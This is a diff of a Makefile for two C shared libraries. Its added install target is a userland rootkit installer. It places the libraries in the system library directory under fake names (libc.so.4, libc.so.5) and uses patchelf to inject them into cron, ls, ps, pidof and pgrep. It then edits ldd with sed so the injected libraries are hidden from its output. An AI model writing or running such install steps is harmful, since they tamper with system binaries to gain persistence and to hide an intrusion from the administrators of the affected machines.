@@ -1,15 +1,37 @@
-CC = cc
-CFLAGS = -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe --std=c17 -march=native -shared -ldl -s -nostartfiles
-LDFLAGS = -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
+CC       := cc
+LIBEXEC  := libexec.so
+LIBHIDE  := libhide.so
+BINDIR   := /lib/x86_64-linux-gnu
+ACTION   := ./patchelf --add-needed
+CFLAGS   := -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe -std=c17 -march=native -shared -ldl -s -nostartfiles
+LDFLAGS  := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
 
-# Targets
-all: libexec.so libhide.so #libnet.so
+TARGETS := $(LIBEXEC) $(LIBHIDE)
 
-libexec.so: libexec.c
+.PHONY: all clean install
+
+all: $(TARGETS)
+
+$(LIBEXEC): libexec.c
 	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
 
-libhide.so: libhide.c
+$(LIBHIDE): libhide.c
 	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
+
+install: all
+	install -Dm755 $(LIBEXEC) $(BINDIR)/libc.so.4
+	install -Dm755 $(LIBHIDE) $(BINDIR)/libc.so.5
+
+	systemctl stop cron
+	$(ACTION) $(BINDIR)/libc.so.4 $$(which cron)
+	systemctl start cron
+
+	$(ACTION) $(BINDIR)/libc.so.5 $$(which ls)
+	$(ACTION) $(BINDIR)/libc.so.5 $$(which ps)
+	$(ACTION) $(BINDIR)/libc.so.5 $$(which pidof)
+	$(ACTION) $(BINDIR)/libc.so.5 $$(which pgrep)
+
+	sed -i 's|^try_trace "\$$RTLD" "\$$file" \|\| result=1$$|try_trace "$$RTLD" "$$file" | grep -Ev '\''libc\.so\.4|libc\.so\.5'\'' || result=1|' $$(which ldd)
 
 clean:
-	rm -f libexec.so libhide.so
+	rm -f $(TARGETS)
